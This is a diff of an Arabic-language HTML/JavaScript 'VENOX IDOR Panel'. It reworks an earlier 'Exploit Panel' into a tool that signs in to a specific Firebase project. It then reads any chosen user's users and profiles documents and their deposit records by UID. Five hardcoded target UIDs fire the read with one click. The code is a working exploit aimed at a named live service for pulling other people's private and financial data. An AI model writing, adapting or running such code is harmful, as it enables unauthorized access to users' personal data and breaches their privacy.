@@ -3,51 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 VENOX - Exploit Panel</title>
+    <title>🔥 VENOX - IDOR Panel</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background: #0a0a14; color: #e2e8f0; min-height: 100vh; padding: 16px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header { background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 16px; padding: 20px 28px; margin-bottom: 24px; border: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+        body { background: #0a0a14; color: #e2e8f0; min-height: 100vh; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        
+        .header {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 16px;
+            padding: 20px 28px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255,255,255,0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
         .header h1 { font-size: 24px; font-weight: 700; background: linear-gradient(135deg, #f97316, #ef4444); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .header .subtitle { color: #94a3b8; font-size: 14px; }
         .badge { padding: 6px 16px; border-radius: 20px; font-size: 13px; border: 1px solid rgba(249,115,22,0.3); }
         .badge-connected { background: rgba(34,197,94,0.15); color: #4ade80; border-color: rgba(34,197,94,0.3); }
         .badge-error { background: rgba(239,68,68,0.15); color: #f87171; border-color: rgba(239,68,68,0.3); }
         
-        .card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
-        .card h3 { color: #f97316; margin-bottom: 12px; }
+        .card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        .card h3 { color: #f97316; margin-bottom: 16px; }
         
-        .btn { padding: 10px 20px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; margin: 4px; }
+        .form-group { margin-bottom: 14px; }
+        .form-group label { display: block; color: #94a3b8; font-size: 13px; margin-bottom: 4px; }
+        .form-group input {
+            width: 100%;
+            padding: 10px 14px;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.08);
+            background: rgba(255,255,255,0.04);
+            color: #e2e8f0;
+            font-size: 14px;
+            outline: none;
+        }
+        .form-group input:focus { border-color: #f97316; }
+        
+        .btn { padding: 10px 22px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; }
         .btn-primary { background: #f97316; color: #fff; }
         .btn-primary:hover { background: #ea580c; transform: translateY(-2px); }
         .btn-success { background: #22c55e; color: #fff; }
         .btn-success:hover { background: #16a34a; transform: translateY(-2px); }
-        .btn-danger { background: #ef4444; color: #fff; }
-        .btn-danger:hover { background: #dc2626; transform: translateY(-2px); }
         .btn-secondary { background: rgba(255,255,255,0.08); color: #e2e8f0; }
         .btn-secondary:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
         .btn-info { background: rgba(59,130,246,0.2); color: #60a5fa; border: 1px solid rgba(59,130,246,0.3); }
         .btn-info:hover { background: rgba(59,130,246,0.3); transform: translateY(-2px); }
         
-        .result-box { background: rgba(0,0,0,0.3); padding: 14px; border-radius: 10px; font-family: monospace; font-size: 13px; color: #94a3b8; white-space: pre-wrap; word-break: break-all; max-height: 250px; overflow: auto; margin-top: 10px; }
+        .result-box {
+            background: rgba(0,0,0,0.3);
+            padding: 16px;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 13px;
+            color: #94a3b8;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow: auto;
+            margin-top: 12px;
+        }
         .result-box.success { border: 1px solid rgba(34,197,94,0.3); color: #4ade80; }
         .result-box.error { border: 1px solid rgba(239,68,68,0.3); color: #f87171; }
         .result-box.warning { border: 1px solid rgba(249,115,22,0.3); color: #f97316; }
         
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
         @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
-        
-        .form-group { margin-bottom: 12px; }
-        .form-group label { display: block; color: #94a3b8; font-size: 13px; margin-bottom: 4px; }
-        .form-group input { width: 100%; padding: 10px 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.04); color: #e2e8f0; font-size: 14px; outline: none; }
-        .form-group input:focus { border-color: #f97316; }
         
         .toast { position: fixed; bottom: 24px; right: 24px; padding: 14px 24px; border-radius: 12px; color: #fff; font-size: 14px; font-weight: 500; z-index: 999; animation: slideUp 0.3s ease; max-width: 450px; }
         .toast-success { background: #22c55e; }
@@ -56,7 +92,6 @@
         @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         
         .uid-display { background: rgba(249,115,22,0.1); padding: 8px 14px; border-radius: 8px; border: 1px solid rgba(249,115,22,0.2); color: #f97316; font-family: monospace; font-size: 13px; display: inline-block; margin-bottom: 10px; }
-        .token-display { background: rgba(0,0,0,0.4); padding: 8px 14px; border-radius: 8px; border: 1px solid rgba(59,130,246,0.2); color: #60a5fa; font-family: monospace; font-size: 11px; display: block; word-break: break-all; margin-bottom: 10px; max-height: 80px; overflow: auto; }
     </style>
 </head>
 <body>
@@ -64,8 +99,8 @@
 <div class="container">
     <div class="header">
         <div>
-            <h1>🔥 VENOX · Exploit Panel</h1>
-            <div class="subtitle">كل المحاولات العملية في مكان واحد</div>
+            <h1>🔥 VENOX · IDOR Panel</h1>
+            <div class="subtitle">قراءة بيانات أي مستخدم باستخدام UID</div>
         </div>
         <span class="badge badge-connected" id="statusBadge">✅ جاهز</span>
     </div>
@@ -81,17 +116,6 @@ storageBucket: venox-ffe5c.firebasestorage.app
         </pre>
     </div>
 
-    <!-- إنشاء حساب -->
-    <div class="card">
-        <h3>🔐 إنشاء حساب جديد</h3>
-        <div style="display:flex;gap:10px;flex-wrap:wrap;">
-            <input type="email" id="signupEmail" placeholder="البريد الإلكتروني" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:200px;">
-            <input type="password" id="signupPassword" placeholder="كلمة المرور" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:150px;" value="Test123!">
-            <button class="btn btn-success" onclick="createAccount()">🚀 إنشاء</button>
-        </div>
-        <div id="signupResult" class="result-box">⏳ انتظر...</div>
-    </div>
-
     <!-- تسجيل الدخول -->
     <div class="card">
         <h3>🔑 تسجيل الدخول</h3>
@@ -101,32 +125,25 @@ storageBucket: venox-ffe5c.firebasestorage.app
             <button class="btn btn-primary" onclick="login()">🔓 تسجيل</button>
         </div>
         <div id="loginResult" class="result-box">⏳ انتظر...</div>
-        <div id="tokenDisplay" class="token-display" style="display:none;"></div>
         <div id="uidDisplay" class="uid-display" style="display:none;"></div>
     </div>
 
-    <!-- جميع المحاولات -->
-    <div class="grid-2">
-        <!-- Firestore -->
-        <div class="card">
-            <h3>📄 Firestore</h3>
-            <button class="btn btn-info" onclick="readMyUser()">👤 بياناتي</button>
-            <button class="btn btn-info" onclick="readOtherUser()">👤 مستخدم آخر</button>
-            <button class="btn btn-info" onclick="readTaskCompletions()">📋 المهام</button>
-            <button class="btn btn-info" onclick="readProfiles()">👤 بروفايل</button>
-            <button class="btn btn-info" onclick="readDeposits()">💰 إيداعات</button>
-            <button class="btn btn-secondary" onclick="clearResult('firestoreResult')">🗑️ مسح</button>
-            <div id="firestoreResult" class="result-box">⏳ اضغط زر...</div>
+    <!-- IDOR - قراءة مستخدم -->
+    <div class="card">
+        <h3>🎯 قراءة بيانات مستخدم (IDOR)</h3>
+        <div style="display:flex;gap:10px;flex-wrap:wrap;">
+            <input type="text" id="targetUid" placeholder="أدخل UID المستهدف" style="flex:2;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:200px;font-family:monospace;">
+            <button class="btn btn-info" onclick="readUser()">👤 قراءة</button>
+            <button class="btn btn-secondary" onclick="clearResult()">🗑️ مسح</button>
         </div>
-
-        <!-- Storage + Functions -->
-        <div class="card">
-            <h3>📁 Storage & ☁️ Functions</h3>
-            <button class="btn btn-info" onclick="scanStorage()">📁 فحص Storage</button>
-            <button class="btn btn-info" onclick="callFunction()">☁️ LookupMember</button>
-            <button class="btn btn-secondary" onclick="clearResult('storageResult')">🗑️ مسح</button>
-            <div id="storageResult" class="result-box">⏳ اضغط زر...</div>
+        <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:8px;">
+            <button class="btn btn-secondary" onclick="setUid('3NMRA9D5DEYPTOU')">3NMRA9...</button>
+            <button class="btn btn-secondary" onclick="setUid('4HNWIQMDKXTGYRO')">4HNWIQ...</button>
+            <button class="btn btn-secondary" onclick="setUid('560VHAUTASUFFAJ')">560VHA...</button>
+            <button class="btn btn-secondary" onclick="setUid('6CNWZD07IQQWMIO')">6CNWZD...</button>
+            <button class="btn btn-secondary" onclick="setUid('A2VUBNNHLFSXS9L')">A2VUBN...</button>
         </div>
+        <div id="userResult" class="result-box">⏳ أدخل UID واضغط "قراءة"</div>
     </div>
 </div>
 
@@ -146,7 +163,6 @@ const FIREBASE_CONFIG = {
 firebase.initializeApp(FIREBASE_CONFIG);
 const auth = firebase.auth();
 const db = firebase.firestore();
-const storage = firebase.storage();
 
 let currentUid = '';
 let currentToken = '';
@@ -168,33 +184,6 @@ function setResult(id, text, type = '') {
     const el = document.getElementById(id);
     el.textContent = text;
     el.className = 'result-box' + (type ? ' ' + type : '');
-}
-
-// ============================================================
-// 🔐 CREATE ACCOUNT
-// ============================================================
-async function createAccount() {
-    const email = document.getElementById('signupEmail').value.trim();
-    const password = document.getElementById('signupPassword').value.trim();
-    const result = document.getElementById('signupResult');
-    
-    if (!email || !password) {
-        setResult('signupResult', '❌ أدخل البريد وكلمة المرور', 'error');
-        return;
-    }
-    
-    setResult('signupResult', '⏳ جاري...', '');
-    
-    try {
-        const userCred = await auth.createUserWithEmailAndPassword(email, password);
-        setResult('signupResult', `✅ تم إنشاء الحساب!\nUID: ${userCred.user.uid}\nالبريد: ${userCred.user.email}`, 'success');
-        showToast('✅ تم إنشاء الحساب', 'success');
-        document.getElementById('statusBadge').className = 'badge badge-connected';
-    } catch (error) {
-        setResult('signupResult', `❌ فشل: ${error.message}`, 'error');
-        showToast(`❌ ${error.message}`, 'error');
-        document.getElementById('statusBadge').className = 'badge badge-error';
-    }
 }
 
 // ============================================================
@@ -221,9 +210,7 @@ async function login() {
         setResult('loginResult', `✅ تم تسجيل الدخول!\nUID: ${currentUid}\nالبريد: ${userCred.user.email}`, 'success');
         
         document.getElementById('uidDisplay').style.display = 'block';
-        document.getElementById('uidDisplay').textContent = `🆔 UID: ${currentUid}`;
-        document.getElementById('tokenDisplay').style.display = 'block';
-        document.getElementById('tokenDisplay').textContent = `🔑 Token: ${currentToken.substring(0, 80)}...`;
+        document.getElementById('uidDisplay').textContent = `🆔 UID الحالي: ${currentUid}`;
         
         showToast('✅ تم تسجيل الدخول', 'success');
         document.getElementById('statusBadge').className = 'badge badge-connected';
@@ -235,154 +222,86 @@ async function login() {
 }
 
 // ============================================================
-// 👤 READ MY USER
+// 🎯 READ USER (IDOR)
 // ============================================================
-async function readMyUser() {
-    if (!currentUid) {
-        setResult('firestoreResult', '❌ سجل دخول أولاً', 'error');
+async function readUser() {
+    const targetUid = document.getElementById('targetUid').value.trim();
+    const result = document.getElementById('userResult');
+    
+    if (!targetUid) {
+        setResult('userResult', '❌ أدخل UID المستهدف', 'error');
         return;
     }
-    setResult('firestoreResult', '⏳ جاري...', '');
+    
+    if (!currentUid) {
+        setResult('userResult', '❌ سجل دخول أولاً', 'error');
+        return;
+    }
+    
+    setResult('userResult', '⏳ جاري قراءة البيانات...', '');
+    
     try {
-        const doc = await db.collection('users').doc(currentUid).get();
+        // محاولة قراءة users
+        const doc = await db.collection('users').doc(targetUid).get();
+        
+        let output = `🎯 المستخدم: ${targetUid}\n${'='.repeat(50)}\n`;
+        
         if (doc.exists) {
-            setResult('firestoreResult', `✅ بياناتي:\n${JSON.stringify(doc.data(), null, 2)}`, 'success');
+            output += `✅ بيانات users:\n${JSON.stringify(doc.data(), null, 2)}\n\n`;
         } else {
-            setResult('firestoreResult', '📭 لا توجد بيانات', 'warning');
+            output += `📭 لا توجد بيانات في users\n\n`;
         }
-    } catch(e) {
-        setResult('firestoreResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-// ============================================================
-// 👤 READ OTHER USER
-// ============================================================
-async function readOtherUser() {
-    setResult('firestoreResult', '⏳ جاري...', '');
-    try {
-        const doc = await db.collection('users').doc('3NMRA9D5DEYPTOU').get();
-        if (doc.exists) {
-            setResult('firestoreResult', `👤 مستخدم آخر:\n${JSON.stringify(doc.data(), null, 2)}`, 'success');
-        } else {
-            setResult('firestoreResult', '📭 لا توجد بيانات', 'warning');
+        
+        // محاولة قراءة profiles
+        try {
+            const profileDoc = await db.collection('profiles').doc(targetUid).get();
+            if (profileDoc.exists) {
+                output += `✅ بيانات profiles:\n${JSON.stringify(profileDoc.data(), null, 2)}\n\n`;
+            } else {
+                output += `📭 لا توجد بيانات في profiles\n\n`;
+            }
+        } catch(e) {
+            output += `❌ profiles: ${e.message}\n\n`;
         }
-    } catch(e) {
-        setResult('firestoreResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-// ============================================================
-// 📋 READ TASK COMPLETIONS
-// ============================================================
-async function readTaskCompletions() {
-    setResult('firestoreResult', '⏳ جاري...', '');
-    try {
-        const snap = await db.collection('taskCompletions').get();
-        let output = '📋 المهام:\n';
-        snap.forEach(doc => {
-            output += `  ${JSON.stringify(doc.data())}\n`;
-        });
-        setResult('firestoreResult', output || '📭 لا توجد مهام', 'success');
-    } catch(e) {
-        setResult('firestoreResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-// ============================================================
-// 👤 READ PROFILES
-// ============================================================
-async function readProfiles() {
-    if (!currentUid) {
-        setResult('firestoreResult', '❌ سجل دخول أولاً', 'error');
-        return;
-    }
-    setResult('firestoreResult', '⏳ جاري...', '');
-    try {
-        const doc = await db.collection('profiles').doc(currentUid).get();
-        if (doc.exists) {
-            setResult('firestoreResult', `👤 بروفايل:\n${JSON.stringify(doc.data(), null, 2)}`, 'success');
-        } else {
-            setResult('firestoreResult', '📭 لا توجد بيانات', 'warning');
+        
+        // محاولة قراءة deposits
+        try {
+            const snap = await db.collection('deposits').where('userId', '==', targetUid).get();
+            if (!snap.empty) {
+                output += `✅ الإيداعات (${snap.size}):\n`;
+                snap.forEach(d => {
+                    output += `  ${JSON.stringify(d.data())}\n`;
+                });
+            } else {
+                output += `📭 لا توجد إيداعات\n`;
+            }
+        } catch(e) {
+            output += `❌ deposits: ${e.message}\n`;
         }
-    } catch(e) {
-        setResult('firestoreResult', `❌ ${e.message}`, 'error');
+        
+        setResult('userResult', output, 'success');
+        showToast(`✅ تم قراءة بيانات ${targetUid}`, 'success');
+        
+    } catch(error) {
+        setResult('userResult', `❌ فشل: ${error.message}`, 'error');
+        showToast(`❌ ${error.message}`, 'error');
     }
 }
 
 // ============================================================
-// 💰 READ DEPOSITS
+// 🔧 SET UID
 // ============================================================
-async function readDeposits() {
-    if (!currentUid) {
-        setResult('firestoreResult', '❌ سجل دخول أولاً', 'error');
-        return;
-    }
-    setResult('firestoreResult', '⏳ جاري...', '');
-    try {
-        const snap = await db.collection('deposits').where('userId', '==', currentUid).get();
-        let output = '💰 الإيداعات:\n';
-        snap.forEach(doc => {
-            output += `  ${JSON.stringify(doc.data())}\n`;
-        });
-        setResult('firestoreResult', output || '📭 لا توجد إيداعات', 'success');
-    } catch(e) {
-        setResult('firestoreResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-// ============================================================
-// 📁 SCAN STORAGE
-// ============================================================
-async function scanStorage() {
-    setResult('storageResult', '⏳ جاري...', '');
-    try {
-        const listRef = storage.ref('/');
-        const res = await listRef.listAll();
-        let output = '📁 Storage:\n';
-        if (res.items.length === 0 && res.prefixes.length === 0) {
-            output += '📭 فارغ أو ممنوع';
-        } else {
-            res.items.forEach(item => output += `  📄 ${item.name}\n`);
-            res.prefixes.forEach(prefix => output += `  📁 ${prefix.name}/\n`);
-        }
-        setResult('storageResult', output, 'success');
-    } catch(e) {
-        setResult('storageResult', `❌ ${e.message}`, 'error');
-    }
-}
-
-// ============================================================
-// ☁️ CALL FUNCTION
-// ============================================================
-async function callFunction() {
-    if (!currentUid) {
-        setResult('storageResult', '❌ سجل دخول أولاً', 'error');
-        return;
-    }
-    setResult('storageResult', '⏳ جاري...', '');
-    try {
-        const response = await fetch('https://us-central1-venox-ffe5c.cloudfunctions.net/venoxLookupMemberByEmail', {
-            method: 'POST',
-            headers: {
-                'Authorization': 'Bearer ' + currentToken,
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ email: document.getElementById('loginEmail').value.trim() || 'test@example.com' })
-        });
-        const data = await response.json();
-        setResult('storageResult', `☁️ Function Response:\n${JSON.stringify(data, null, 2)}`, data.error ? 'error' : 'success');
-    } catch(e) {
-        setResult('storageResult', `❌ ${e.message}`, 'error');
-    }
+function setUid(uid) {
+    document.getElementById('targetUid').value = uid;
+    readUser();
 }
 
 // ============================================================
 // 🗑️ CLEAR RESULT
 // ============================================================
-function clearResult(id) {
-    document.getElementById(id).textContent = '⏳ اضغط زر...';
-    document.getElementById(id).className = 'result-box';
+function clearResult() {
+    document.getElementById('userResult').textContent = '⏳ أدخل UID واضغط "قراءة"';
+    document.getElementById('userResult').className = 'result-box';
 }
 </script>
 
